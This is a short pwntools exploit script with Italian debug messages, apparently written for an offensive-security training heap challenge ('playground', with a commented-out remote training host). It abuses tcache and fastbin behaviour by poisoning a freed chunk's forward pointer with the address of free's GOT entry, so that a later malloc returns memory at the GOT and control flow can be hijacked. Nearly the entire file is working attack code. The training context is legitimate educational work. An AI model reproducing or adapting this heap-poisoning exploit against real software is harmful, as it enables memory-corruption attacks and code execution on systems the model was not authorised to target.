from pwn import*

r = process("./playground")
#r = remote("bin.training.offdef.it", 10101)

gdb.attach(r,
'''
b *(main+243)
''')

input("wait")

def malloc(n):
	r.sendline(b"malloc " + bytes(str(n),encoding="utf-8"))
	r.recvuntil(b"==> ")
	pointer = r.recv()[:-1]
	return pointer

def free(pointer):
	r.sendline(b"free " + pointer)
	r.recv()

def write(pointer,n,what_to_write):
	r.sendline(b"write " + pointer + b" " + bytes(str(n),encoding="utf-8"))
	#input("wait")
	r.send(what_to_write)
	r.recv()

r.recvuntil(b"main: ")
app = r.recv()[:-3]
#print(app)
main_address = int(app,16)

print("PROVA")
print(hex(main_address))

addr_list = []

for i in range(0,7):
	print(i)
	addr_list.append(malloc(0x60))

print("SOVRASCRITTO LA TCACHE")

mia_malloc = malloc(0x60)

print("la mia malloc ha questo indirizzo")
print(mia_malloc)

for i in range(0,7):
	print(i)
	free(addr_list[i])
print("DEALLOCATO LA TCACHE")

free(mia_malloc)
print("DEALLOCATA LA MIA MALLOC")

offset_free_got = 0x2e04

write(mia_malloc,0x10, p64(main_address+offset_free_got))

print("allocazione tcache dopo la write")
for i in range(0,7):
	print(i)
	malloc(0x60)

print("allocazione fastbin")
app = malloc(0x60)

malloc(0x60)



input("wait")




#c1 = malloc(0x100)
#malloc(0x10)
#c2 = malloc(0x100)
#malloc(0x10)
#print("MALLOC FATTE")

#free(c2)
#free(c1)

#print("FREE FATTE")



#write(c2,0x10, p64(main_address + offset_free_got))
#print("WRITE FATTA")

#input("wait")
#malloc(0x600)
#input("malloc 1 fatta: wait")
#malloc(0x600)
#print("MALLOC FATTE")

r.interactive()
